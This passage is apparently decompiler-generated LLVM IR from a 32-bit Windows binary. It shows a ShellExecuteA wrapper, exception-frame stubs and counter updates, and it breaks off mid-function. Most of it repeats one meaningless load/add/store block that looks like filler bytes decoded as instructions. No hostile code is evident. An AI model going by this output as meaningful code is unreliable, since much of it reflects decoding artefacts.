  store i8 %202, i8* %203, align 1, !insn.addr !366
  %204 = load i8, i8* %13, align 4, !insn.addr !367
  %205 = load i32, i32* %eax, align 4
  %206 = trunc i32 %205 to i8, !insn.addr !367
  %207 = add i8 %204, %206, !insn.addr !367
  %208 = inttoptr i32 %205 to i8*, !insn.addr !367
  store i8 %207, i8* %208, align 1, !insn.addr !367
  %209 = load i8, i8* %13, align 4, !insn.addr !368
  %210 = load i32, i32* %eax, align 4
  %211 = trunc i32 %210 to i8, !insn.addr !368
  %212 = add i8 %209, %211, !insn.addr !368
  %213 = inttoptr i32 %210 to i8*, !insn.addr !368
  store i8 %212, i8* %213, align 1, !insn.addr !368
  %214 = load i8, i8* %13, align 4, !insn.addr !369
  %215 = load i32, i32* %eax, align 4
  %216 = trunc i32 %215 to i8, !insn.addr !369
  %217 = add i8 %214, %216, !insn.addr !369
  %218 = inttoptr i32 %215 to i8*, !insn.addr !369
  store i8 %217, i8* %218, align 1, !insn.addr !369
  %219 = load i8, i8* %13, align 4, !insn.addr !370
  %220 = load i32, i32* %eax, align 4
  %221 = trunc i32 %220 to i8, !insn.addr !370
  %222 = add i8 %219, %221, !insn.addr !370
  %223 = inttoptr i32 %220 to i8*, !insn.addr !370
  store i8 %222, i8* %223, align 1, !insn.addr !370
  %224 = load i8, i8* %13, align 4, !insn.addr !371
  %225 = load i32, i32* %eax, align 4
  %226 = trunc i32 %225 to i8, !insn.addr !371
  %227 = add i8 %224, %226, !insn.addr !371
  %228 = inttoptr i32 %225 to i8*, !insn.addr !371
  store i8 %227, i8* %228, align 1, !insn.addr !371
  %229 = load i8, i8* %13, align 4, !insn.addr !372
  %230 = load i32, i32* %eax, align 4
  %231 = trunc i32 %230 to i8, !insn.addr !372
  %232 = add i8 %229, %231, !insn.addr !372
  %233 = inttoptr i32 %230 to i8*, !insn.addr !372
  store i8 %232, i8* %233, align 1, !insn.addr !372
  %234 = load i8, i8* %13, align 4, !insn.addr !373
  %235 = load i32, i32* %eax, align 4
  %236 = trunc i32 %235 to i8, !insn.addr !373
  %237 = add i8 %234, %236, !insn.addr !373
  %238 = inttoptr i32 %235 to i8*, !insn.addr !373
  store i8 %237, i8* %238, align 1, !insn.addr !373
  %239 = load i8, i8* %13, align 4, !insn.addr !374
  %240 = load i32, i32* %eax, align 4
  %241 = trunc i32 %240 to i8, !insn.addr !374
  %242 = add i8 %239, %241, !insn.addr !374
  %243 = inttoptr i32 %240 to i8*, !insn.addr !374
  store i8 %242, i8* %243, align 1, !insn.addr !374
  %244 = load i8, i8* %13, align 4, !insn.addr !375
  %245 = load i32, i32* %eax, align 4
  %246 = trunc i32 %245 to i8, !insn.addr !375
  %247 = add i8 %244, %246, !insn.addr !375
  %248 = inttoptr i32 %245 to i8*, !insn.addr !375
  store i8 %247, i8* %248, align 1, !insn.addr !375
  %249 = load i8, i8* %13, align 4, !insn.addr !376
  %250 = load i32, i32* %eax, align 4
  %251 = trunc i32 %250 to i8, !insn.addr !376
  %252 = add i8 %249, %251, !insn.addr !376
  %253 = inttoptr i32 %250 to i8*, !insn.addr !376
  store i8 %252, i8* %253, align 1, !insn.addr !376
  %254 = load i8, i8* %13, align 4, !insn.addr !377
  %255 = load i32, i32* %eax, align 4
  %256 = trunc i32 %255 to i8, !insn.addr !377
  %257 = add i8 %254, %256, !insn.addr !377
  %258 = inttoptr i32 %255 to i8*, !insn.addr !377
  store i8 %257, i8* %258, align 1, !insn.addr !377
  %259 = load i8, i8* %13, align 4, !insn.addr !378
  %260 = load i32, i32* %eax, align 4
  %261 = trunc i32 %260 to i8, !insn.addr !378
  %262 = add i8 %259, %261, !insn.addr !378
  %263 = inttoptr i32 %260 to i8*, !insn.addr !378
  store i8 %262, i8* %263, align 1, !insn.addr !378
  %264 = load i8, i8* %13, align 4, !insn.addr !379
  %265 = load i32, i32* %eax, align 4
  %266 = trunc i32 %265 to i8, !insn.addr !379
  %267 = add i8 %264, %266, !insn.addr !379
  %268 = inttoptr i32 %265 to i8*, !insn.addr !379
  store i8 %267, i8* %268, align 1, !insn.addr !379
  %269 = load i8, i8* %13, align 4, !insn.addr !380
  %270 = load i32, i32* %eax, align 4
  %271 = trunc i32 %270 to i8, !insn.addr !380
  %272 = add i8 %269, %271, !insn.addr !380
  %273 = inttoptr i32 %270 to i8*, !insn.addr !380
  store i8 %272, i8* %273, align 1, !insn.addr !380
  %274 = load i8, i8* %13, align 4, !insn.addr !381
  %275 = load i32, i32* %eax, align 4
  %276 = trunc i32 %275 to i8, !insn.addr !381
  %277 = add i8 %274, %276, !insn.addr !381
  %278 = inttoptr i32 %275 to i8*, !insn.addr !381
  store i8 %277, i8* %278, align 1, !insn.addr !381
  %279 = load i8, i8* %13, align 4, !insn.addr !382
  %280 = load i32, i32* %eax, align 4
  %281 = trunc i32 %280 to i8, !insn.addr !382
  %282 = add i8 %279, %281, !insn.addr !382
  %283 = inttoptr i32 %280 to i8*, !insn.addr !382
  store i8 %282, i8* %283, align 1, !insn.addr !382
  %284 = load i8, i8* %13, align 4, !insn.addr !383
  %285 = load i32, i32* %eax, align 4
  %286 = trunc i32 %285 to i8, !insn.addr !383
  %287 = add i8 %284, %286, !insn.addr !383
  %288 = inttoptr i32 %285 to i8*, !insn.addr !383
  store i8 %287, i8* %288, align 1, !insn.addr !383
  %289 = load i8, i8* %13, align 4, !insn.addr !384
  %290 = load i32, i32* %eax, align 4
  %291 = trunc i32 %290 to i8, !insn.addr !384
  %292 = add i8 %289, %291, !insn.addr !384
  %293 = inttoptr i32 %290 to i8*, !insn.addr !384
  store i8 %292, i8* %293, align 1, !insn.addr !384
  %294 = load i8, i8* %13, align 4, !insn.addr !385
  %295 = load i32, i32* %eax, align 4
  %296 = trunc i32 %295 to i8, !insn.addr !385
  %297 = add i8 %294, %296, !insn.addr !385
  %298 = inttoptr i32 %295 to i8*, !insn.addr !385
  store i8 %297, i8* %298, align 1, !insn.addr !385
  %299 = load i8, i8* %13, align 4, !insn.addr !386
  %300 = load i32, i32* %eax, align 4
  %301 = trunc i32 %300 to i8, !insn.addr !386
  %302 = add i8 %299, %301, !insn.addr !386
  %303 = inttoptr i32 %300 to i8*, !insn.addr !386
  store i8 %302, i8* %303, align 1, !insn.addr !386
  %304 = load i8, i8* %13, align 4, !insn.addr !387
  %305 = load i32, i32* %eax, align 4
  %306 = trunc i32 %305 to i8, !insn.addr !387
  %307 = add i8 %304, %306, !insn.addr !387
  %308 = inttoptr i32 %305 to i8*, !insn.addr !387
  store i8 %307, i8* %308, align 1, !insn.addr !387
  %309 = load i8, i8* %13, align 4, !insn.addr !388
  %310 = load i32, i32* %eax, align 4
  %311 = trunc i32 %310 to i8, !insn.addr !388
  %312 = add i8 %309, %311, !insn.addr !388
  %313 = inttoptr i32 %310 to i8*, !insn.addr !388
  store i8 %312, i8* %313, align 1, !insn.addr !388
  %314 = load i8, i8* %13, align 4, !insn.addr !389
  %315 = load i32, i32* %eax, align 4
  %316 = trunc i32 %315 to i8, !insn.addr !389
  %317 = add i8 %314, %316, !insn.addr !389
  %318 = inttoptr i32 %315 to i8*, !insn.addr !389
  store i8 %317, i8* %318, align 1, !insn.addr !389
  %319 = load i8, i8* %13, align 4, !insn.addr !390
  %320 = load i32, i32* %eax, align 4
  %321 = trunc i32 %320 to i8, !insn.addr !390
  %322 = add i8 %319, %321, !insn.addr !390
  %323 = inttoptr i32 %320 to i8*, !insn.addr !390
  store i8 %322, i8* %323, align 1, !insn.addr !390
  %324 = load i8, i8* %13, align 4, !insn.addr !391
  %325 = load i32, i32* %eax, align 4
  %326 = trunc i32 %325 to i8, !insn.addr !391
  %327 = add i8 %324, %326, !insn.addr !391
  %328 = inttoptr i32 %325 to i8*, !insn.addr !391
  store i8 %327, i8* %328, align 1, !insn.addr !391
  %329 = load i8, i8* %13, align 4, !insn.addr !392
  %330 = load i32, i32* %eax, align 4
  %331 = trunc i32 %330 to i8, !insn.addr !392
  %332 = add i8 %329, %331, !insn.addr !392
  %333 = inttoptr i32 %330 to i8*, !insn.addr !392
  store i8 %332, i8* %333, align 1, !insn.addr !392
  %334 = load i8, i8* %13, align 4, !insn.addr !393
  %335 = load i32, i32* %eax, align 4
  %336 = trunc i32 %335 to i8, !insn.addr !393
  %337 = add i8 %334, %336, !insn.addr !393
  %338 = inttoptr i32 %335 to i8*, !insn.addr !393
  store i8 %337, i8* %338, align 1, !insn.addr !393
  %339 = load i8, i8* %13, align 4, !insn.addr !394
  %340 = load i32, i32* %eax, align 4
  %341 = trunc i32 %340 to i8, !insn.addr !394
  %342 = add i8 %339, %341, !insn.addr !394
  %343 = inttoptr i32 %340 to i8*, !insn.addr !394
  store i8 %342, i8* %343, align 1, !insn.addr !394
  %344 = mul i32 %156, 2, !insn.addr !395
  %345 = add i32 %344, 117, !insn.addr !395
  %346 = add i32 %345, %12, !insn.addr !395
  %347 = inttoptr i32 %346 to i8*, !insn.addr !395
  %348 = load i8, i8* %347, align 1, !insn.addr !395
  %349 = add i8 %348, %190, !insn.addr !395
  %350 = xor i8 %349, %348, !insn.addr !395
  %351 = xor i8 %349, %190, !insn.addr !395
  %352 = and i8 %350, %351, !insn.addr !395
  %353 = icmp slt i8 %352, 0, !insn.addr !395
  store i8 %349, i8* %347, align 1, !insn.addr !395
  %354 = icmp eq i1 %353, false, !insn.addr !396
  br i1 %354, label %dec_label_pc_404962, label %dec_label_pc_404925, !insn.addr !396

dec_label_pc_404925:                              ; preds = %dec_label_pc_4048cf
  %355 = xor i32 %12, %2, !insn.addr !397
  %356 = trunc i32 %2 to i16, !insn.addr !398
  %357 = call i32 @__readfsdword(i32 %355), !insn.addr !398
  call void @__asm_outsd(i16 %356, i32 %357), !insn.addr !398
  %358 = load i8, i8* %13, align 4, !insn.addr !399
  %359 = load i32, i32* %eax, align 4
  %360 = trunc i32 %359 to i8, !insn.addr !399
  %361 = add i8 %358, %360, !insn.addr !399
  %362 = inttoptr i32 %359 to i8*, !insn.addr !399
  store i8 %361, i8* %362, align 1, !insn.addr !399
  %363 = load i8, i8* %13, align 4, !insn.addr !400
  %364 = load i32, i32* %eax, align 4
  %365 = trunc i32 %364 to i8, !insn.addr !400
  %366 = add i8 %363, %365, !insn.addr !400
  %367 = inttoptr i32 %364 to i8*, !insn.addr !400
  store i8 %366, i8* %367, align 1, !insn.addr !400
  %368 = load i8, i8* %13, align 4, !insn.addr !401
  %369 = load i32, i32* %eax, align 4
  %370 = trunc i32 %369 to i8, !insn.addr !401
  %371 = add i8 %368, %370, !insn.addr !401
  %372 = inttoptr i32 %369 to i8*, !insn.addr !401
  store i8 %371, i8* %372, align 1, !insn.addr !401
  %373 = load i8, i8* %13, align 4, !insn.addr !402
  %374 = load i32, i32* %eax, align 4
  %375 = trunc i32 %374 to i8, !insn.addr !402
  %376 = add i8 %373, %375, !insn.addr !402
  %377 = inttoptr i32 %374 to i8*, !insn.addr !402
  store i8 %376, i8* %377, align 1, !insn.addr !402
  %378 = load i8, i8* %13, align 4, !insn.addr !403
  %379 = load i32, i32* %eax, align 4
  %380 = trunc i32 %379 to i8, !insn.addr !403
  %381 = add i8 %378, %380, !insn.addr !403
  %382 = inttoptr i32 %379 to i8*, !insn.addr !403
  store i8 %381, i8* %382, align 1, !insn.addr !403
  %383 = load i8, i8* %13, align 4, !insn.addr !404
  %384 = load i32, i32* %eax, align 4
  %385 = trunc i32 %384 to i8, !insn.addr !404
  %386 = add i8 %383, %385, !insn.addr !404
  %387 = inttoptr i32 %384 to i8*, !insn.addr !404
  store i8 %386, i8* %387, align 1, !insn.addr !404
  %388 = load i8, i8* %13, align 4, !insn.addr !405
  %389 = load i32, i32* %eax, align 4
  %390 = trunc i32 %389 to i8, !insn.addr !405
  %391 = add i8 %388, %390, !insn.addr !405
  %392 = inttoptr i32 %389 to i8*, !insn.addr !405
  store i8 %391, i8* %392, align 1, !insn.addr !405
  %393 = load i8, i8* %13, align 4, !insn.addr !406
  %394 = load i32, i32* %eax, align 4
  %395 = trunc i32 %394 to i8, !insn.addr !406
  %396 = add i8 %393, %395, !insn.addr !406
  %397 = inttoptr i32 %394 to i8*, !insn.addr !406
  store i8 %396, i8* %397, align 1, !insn.addr !406
  %398 = load i8, i8* %13, align 4, !insn.addr !407
  %399 = load i32, i32* %eax, align 4
  %400 = trunc i32 %399 to i8, !insn.addr !407
  %401 = add i8 %398, %400, !insn.addr !407
  %402 = inttoptr i32 %399 to i8*, !insn.addr !407
  store i8 %401, i8* %402, align 1, !insn.addr !407
  %403 = load i8, i8* %13, align 4, !insn.addr !408
  %404 = load i32, i32* %eax, align 4
  %405 = trunc i32 %404 to i8, !insn.addr !408
  %406 = add i8 %403, %405, !insn.addr !408
  %407 = inttoptr i32 %404 to i8*, !insn.addr !408
  store i8 %406, i8* %407, align 1, !insn.addr !408
  %408 = load i8, i8* %13, align 4, !insn.addr !409
  %409 = load i32, i32* %eax, align 4
  %410 = trunc i32 %409 to i8, !insn.addr !409
  %411 = add i8 %408, %410, !insn.addr !409
  %412 = inttoptr i32 %409 to i8*, !insn.addr !409
  store i8 %411, i8* %412, align 1, !insn.addr !409
  %413 = load i8, i8* %13, align 4, !insn.addr !410
  %414 = load i32, i32* %eax, align 4
  %415 = trunc i32 %414 to i8, !insn.addr !410
  %416 = add i8 %413, %415, !insn.addr !410
  %417 = inttoptr i32 %414 to i8*, !insn.addr !410
  store i8 %416, i8* %417, align 1, !insn.addr !410
  %418 = load i8, i8* %13, align 4, !insn.addr !411
  %419 = load i32, i32* %eax, align 4
  %420 = trunc i32 %419 to i8, !insn.addr !411
  %421 = add i8 %418, %420, !insn.addr !411
  %422 = inttoptr i32 %419 to i8*, !insn.addr !411
  store i8 %421, i8* %422, align 1, !insn.addr !411
  %423 = load i8, i8* %13, align 4, !insn.addr !412
  %424 = load i32, i32* %eax, align 4
  %425 = trunc i32 %424 to i8, !insn.addr !412
  %426 = add i8 %423, %425, !insn.addr !412
  %427 = inttoptr i32 %424 to i8*, !insn.addr !412
  store i8 %426, i8* %427, align 1, !insn.addr !412
  %428 = load i8, i8* %13, align 4, !insn.addr !413
  %429 = load i32, i32* %eax, align 4
  %430 = trunc i32 %429 to i8, !insn.addr !413
  %431 = add i8 %428, %430, !insn.addr !413
  %432 = inttoptr i32 %429 to i8*, !insn.addr !413
  store i8 %431, i8* %432, align 1, !insn.addr !413
  %433 = load i8, i8* %13, align 4, !insn.addr !414
  %434 = load i32, i32* %eax, align 4
  %435 = trunc i32 %434 to i8, !insn.addr !414
  %436 = add i8 %433, %435, !insn.addr !414
  %437 = inttoptr i32 %434 to i8*, !insn.addr !414
  store i8 %436, i8* %437, align 1, !insn.addr !414
  %438 = load i8, i8* %13, align 4, !insn.addr !415
  %439 = load i32, i32* %eax, align 4
  %440 = trunc i32 %439 to i8, !insn.addr !415
  %441 = add i8 %438, %440, !insn.addr !415
  %442 = inttoptr i32 %439 to i8*, !insn.addr !415
  store i8 %441, i8* %442, align 1, !insn.addr !415
  %443 = load i8, i8* %13, align 4, !insn.addr !416
  %444 = load i32, i32* %eax, align 4
  %445 = trunc i32 %444 to i8, !insn.addr !416
  %446 = add i8 %443, %445, !insn.addr !416
  %447 = inttoptr i32 %444 to i8*, !insn.addr !416
  store i8 %446, i8* %447, align 1, !insn.addr !416
  %448 = load i8, i8* %13, align 4, !insn.addr !417
  %449 = load i32, i32* %eax, align 4
  %450 = trunc i32 %449 to i8, !insn.addr !417
  %451 = add i8 %448, %450, !insn.addr !417
  %452 = inttoptr i32 %449 to i8*, !insn.addr !417
  store i8 %451, i8* %452, align 1, !insn.addr !417
  %453 = load i8, i8* %13, align 4, !insn.addr !418
  %454 = load i32, i32* %eax, align 4
  %455 = trunc i32 %454 to i8, !insn.addr !418
  %456 = add i8 %453, %455, !insn.addr !418
  %457 = inttoptr i32 %454 to i8*, !insn.addr !418
  store i8 %456, i8* %457, align 1, !insn.addr !418
  %458 = load i8, i8* %13, align 4, !insn.addr !419
  %459 = load i32, i32* %eax, align 4
  %460 = trunc i32 %459 to i8, !insn.addr !419
  %461 = add i8 %458, %460, !insn.addr !419
  %462 = inttoptr i32 %459 to i8*, !insn.addr !419
  store i8 %461, i8* %462, align 1, !insn.addr !419
  %463 = load i8, i8* %13, align 4, !insn.addr !420
  %464 = load i32, i32* %eax, align 4
  %465 = trunc i32 %464 to i8, !insn.addr !420
  %466 = add i8 %463, %465, !insn.addr !420
  %467 = inttoptr i32 %464 to i8*, !insn.addr !420
  store i8 %466, i8* %467, align 1, !insn.addr !420
  %468 = load i8, i8* %13, align 4, !insn.addr !421
  %469 = load i32, i32* %eax, align 4
  %470 = trunc i32 %469 to i8, !insn.addr !421
  %471 = add i8 %468, %470, !insn.addr !421
  %472 = inttoptr i32 %469 to i8*, !insn.addr !421
  store i8 %471, i8* %472, align 1, !insn.addr !421
  %473 = load i8, i8* %13, align 4, !insn.addr !422
  %474 = load i32, i32* %eax, align 4
  %475 = trunc i32 %474 to i8, !insn.addr !422
  %476 = add i8 %473, %475, !insn.addr !422
  %477 = inttoptr i32 %474 to i8*, !insn.addr !422
  store i8 %476, i8* %477, align 1, !insn.addr !422
  %478 = load i8, i8* %13, align 4, !insn.addr !423
  %479 = load i32, i32* %eax, align 4
  %480 = trunc i32 %479 to i8, !insn.addr !423
  %481 = add i8 %478, %480, !insn.addr !423
  %482 = inttoptr i32 %479 to i8*, !insn.addr !423
  store i8 %481, i8* %482, align 1, !insn.addr !423
  %483 = load i8, i8* %13, align 4, !insn.addr !424
  %484 = load i32, i32* %eax, align 4
  %485 = trunc i32 %484 to i8, !insn.addr !424
  %486 = add i8 %483, %485, !insn.addr !424
  %487 = inttoptr i32 %484 to i8*, !insn.addr !424
  store i8 %486, i8* %487, align 1, !insn.addr !424
  br label %dec_label_pc_404962, !insn.addr !424

dec_label_pc_404962:                              ; preds = %dec_label_pc_404925, %dec_label_pc_4048cf
  %488 = load i8, i8* %13, align 4, !insn.addr !425
  %489 = load i32, i32* %eax, align 4
  %490 = trunc i32 %489 to i8, !insn.addr !425
  %491 = add i8 %488, %490, !insn.addr !425
  %492 = icmp slt i8 %491, 0, !insn.addr !425
  %493 = inttoptr i32 %489 to i8*, !insn.addr !425
  store i8 %491, i8* %493, align 1, !insn.addr !425
  br i1 %492, label %dec_label_pc_4049e5, label %dec_label_pc_40496f, !insn.addr !426

dec_label_pc_40496f:                              ; preds = %dec_label_pc_404962
  %494 = load i8, i8* %13, align 4, !insn.addr !427
  %495 = load i32, i32* %eax, align 4
  %496 = trunc i32 %495 to i8, !insn.addr !427
  %497 = add i8 %494, %496, !insn.addr !427
  %498 = inttoptr i32 %495 to i8*, !insn.addr !427
  store i8 %497, i8* %498, align 1, !insn.addr !427
  %499 = load i8, i8* %13, align 4, !insn.addr !428
  %500 = load i32, i32* %eax, align 4
  %501 = trunc i32 %500 to i8, !insn.addr !428
  %502 = add i8 %499, %501, !insn.addr !428
  %503 = inttoptr i32 %500 to i8*, !insn.addr !428
  store i8 %502, i8* %503, align 1, !insn.addr !428
  %504 = load i8, i8* %13, align 4, !insn.addr !429
  %505 = load i32, i32* %eax, align 4
  %506 = trunc i32 %505 to i8, !insn.addr !429
  %507 = add i8 %504, %506, !insn.addr !429
  %508 = inttoptr i32 %505 to i8*, !insn.addr !429
  store i8 %507, i8* %508, align 1, !insn.addr !429
  %509 = load i8, i8* %13, align 4, !insn.addr !430
  %510 = load i32, i32* %eax, align 4
  %511 = trunc i32 %510 to i8, !insn.addr !430
  %512 = add i8 %509, %511, !insn.addr !430
  %513 = inttoptr i32 %510 to i8*, !insn.addr !430
  store i8 %512, i8* %513, align 1, !insn.addr !430
  %514 = load i8, i8* %13, align 4, !insn.addr !431
  %515 = load i32, i32* %eax, align 4
  %516 = trunc i32 %515 to i8, !insn.addr !431
  %517 = add i8 %514, %516, !insn.addr !431
  %518 = inttoptr i32 %515 to i8*, !insn.addr !431
  store i8 %517, i8* %518, align 1, !insn.addr !431
  %519 = load i8, i8* %13, align 4, !insn.addr !432
  %520 = load i32, i32* %eax, align 4
  %521 = trunc i32 %520 to i8, !insn.addr !432
  %522 = add i8 %519, %521, !insn.addr !432
  %523 = inttoptr i32 %520 to i8*, !insn.addr !432
  store i8 %522, i8* %523, align 1, !insn.addr !432
  %524 = load i8, i8* %13, align 4, !insn.addr !433
  %525 = load i32, i32* %eax, align 4
  %526 = trunc i32 %525 to i8, !insn.addr !433
  %527 = add i8 %524, %526, !insn.addr !433
  %528 = inttoptr i32 %525 to i8*, !insn.addr !433
  store i8 %527, i8* %528, align 1, !insn.addr !433
  %529 = load i8, i8* %13, align 4, !insn.addr !434
  %530 = load i32, i32* %eax, align 4
  %531 = trunc i32 %530 to i8, !insn.addr !434
  %532 = add i8 %529, %531, !insn.addr !434
  %533 = inttoptr i32 %530 to i8*, !insn.addr !434
  store i8 %532, i8* %533, align 1, !insn.addr !434
  %534 = load i8, i8* %13, align 4, !insn.addr !435
  %535 = load i32, i32* %eax, align 4
  %536 = trunc i32 %535 to i8, !insn.addr !435
  %537 = add i8 %534, %536, !insn.addr !435
  %538 = inttoptr i32 %535 to i8*, !insn.addr !435
  store i8 %537, i8* %538, align 1, !insn.addr !435
  %539 = load i8, i8* %13, align 4, !insn.addr !436
  %540 = load i32, i32* %eax, align 4
  %541 = trunc i32 %540 to i8, !insn.addr !436
  %542 = add i8 %539, %541, !insn.addr !436
  %543 = inttoptr i32 %540 to i8*, !insn.addr !436
  store i8 %542, i8* %543, align 1, !insn.addr !436
  %544 = load i8, i8* %13, align 4, !insn.addr !437
  %545 = load i32, i32* %eax, align 4
  %546 = trunc i32 %545 to i8, !insn.addr !437
  %547 = add i8 %544, %546, !insn.addr !437
  %548 = inttoptr i32 %545 to i8*, !insn.addr !437
  store i8 %547, i8* %548, align 1, !insn.addr !437
  %549 = load i8, i8* %13, align 4, !insn.addr !438
  %550 = load i32, i32* %eax, align 4
  %551 = trunc i32 %550 to i8, !insn.addr !438
  %552 = add i8 %549, %551, !insn.addr !438
  %553 = inttoptr i32 %550 to i8*, !insn.addr !438
  store i8 %552, i8* %553, align 1, !insn.addr !438
  %554 = load i8, i8* %13, align 4, !insn.addr !439
  %555 = load i32, i32* %eax, align 4
  %556 = trunc i32 %555 to i8, !insn.addr !439
  %557 = add i8 %554, %556, !insn.addr !439
  %558 = inttoptr i32 %555 to i8*, !insn.addr !439
  store i8 %557, i8* %558, align 1, !insn.addr !439
  %559 = load i8, i8* %13, align 4, !insn.addr !440
  %560 = load i32, i32* %eax, align 4
  %561 = trunc i32 %560 to i8, !insn.addr !440
  %562 = add i8 %559, %561, !insn.addr !440
  %563 = inttoptr i32 %560 to i8*, !insn.addr !440
  store i8 %562, i8* %563, align 1, !insn.addr !440
  %564 = load i8, i8* %13, align 4, !insn.addr !441
  %565 = load i32, i32* %eax, align 4
  %566 = trunc i32 %565 to i8, !insn.addr !441
  %567 = add i8 %564, %566, !insn.addr !441
  %568 = inttoptr i32 %565 to i8*, !insn.addr !441
  store i8 %567, i8* %568, align 1, !insn.addr !441
  %569 = load i8, i8* %13, align 4, !insn.addr !442
  %570 = load i32, i32* %eax, align 4
  %571 = trunc i32 %570 to i8, !insn.addr !442
  %572 = add i8 %569, %571, !insn.addr !442
  %573 = inttoptr i32 %570 to i8*, !insn.addr !442
  store i8 %572, i8* %573, align 1, !insn.addr !442
  %574 = load i8, i8* %13, align 4, !insn.addr !443
  %575 = load i32, i32* %eax, align 4
  %576 = trunc i32 %575 to i8, !insn.addr !443
  %577 = add i8 %574, %576, !insn.addr !443
  %578 = inttoptr i32 %575 to i8*, !insn.addr !443
  store i8 %577, i8* %578, align 1, !insn.addr !443
  %579 = load i8, i8* %13, align 4, !insn.addr !444
  %580 = load i32, i32* %eax, align 4
  %581 = trunc i32 %580 to i8, !insn.addr !444
  %582 = add i8 %579, %581, !insn.addr !444
  %583 = inttoptr i32 %580 to i8*, !insn.addr !444
  store i8 %582, i8* %583, align 1, !insn.addr !444
  %584 = load i8, i8* %13, align 4, !insn.addr !445
  %585 = load i32, i32* %eax, align 4
  %586 = trunc i32 %585 to i8, !insn.addr !445
  %587 = add i8 %584, %586, !insn.addr !445
  %588 = inttoptr i32 %585 to i8*, !insn.addr !445
  store i8 %587, i8* %588, align 1, !insn.addr !445
  %589 = load i8, i8* %13, align 4, !insn.addr !446
  %590 = load i32, i32* %eax, align 4
  %591 = trunc i32 %590 to i8, !insn.addr !446
  %592 = add i8 %589, %591, !insn.addr !446
  %593 = inttoptr i32 %590 to i8*, !insn.addr !446
  store i8 %592, i8* %593, align 1, !insn.addr !446
  %594 = load i8, i8* %13, align 4, !insn.addr !447
  %595 = load i32, i32* %eax, align 4
  %596 = trunc i32 %595 to i8, !insn.addr !447
  %597 = add i8 %594, %596, !insn.addr !447
  %598 = inttoptr i32 %595 to i8*, !insn.addr !447
  store i8 %597, i8* %598, align 1, !insn.addr !447
  %599 = load i32, i32* %eax, align 4, !insn.addr !448
  ret i32 %599, !insn.addr !448

dec_label_pc_4049e5:                              ; preds = %dec_label_pc_404962
  %600 = load i32, i32* %eax, align 4, !insn.addr !449
  %601 = call i32 @__readfsdword(i32 %600), !insn.addr !449
  store i32 %601, i32* %stack_var_-16, align 4, !insn.addr !449
  %602 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !449
  %603 = load i32, i32* %eax, align 4, !insn.addr !450
  call void @__writefsdword(i32 %603, i32 %602), !insn.addr !450
  %604 = load i32, i32* @global_var_40968c, align 4, !insn.addr !451
  %605 = add i32 %604, 1, !insn.addr !451
  store i32 %605, i32* @global_var_40968c, align 4, !insn.addr !451
  %606 = load i32, i32* %stack_var_-16, align 4, !insn.addr !452
  call void @__writefsdword(i32 0, i32 %606), !insn.addr !453
  ret i32 0, !insn.addr !454
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !455
  ret i32 %0, !insn.addr !455
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !456
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !457
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !458
  %2 = add i32 %1, -1, !insn.addr !458
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !458
  ret i32 %0, !insn.addr !459
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !460
  ret i32* %0, !insn.addr !460
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !461
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !461
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !461
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !462
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !463
  %3 = add i32 %2, 1, !insn.addr !463
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !463
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !464
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !465
  ret i32 0, !insn.addr !466
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !467
  ret i32 %0, !insn.addr !467
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !468
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !469
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !470
  %2 = add i32 %1, -1, !insn.addr !470
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !470
  ret i32 %0, !insn.addr !471
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !472
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !472
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !472
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !473
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !474
  %3 = add i32 %2, 1, !insn.addr !474
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !474
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !475
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !476
  ret i32 0, !insn.addr !477
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !478
  ret i32 %0, !insn.addr !478
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !479
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
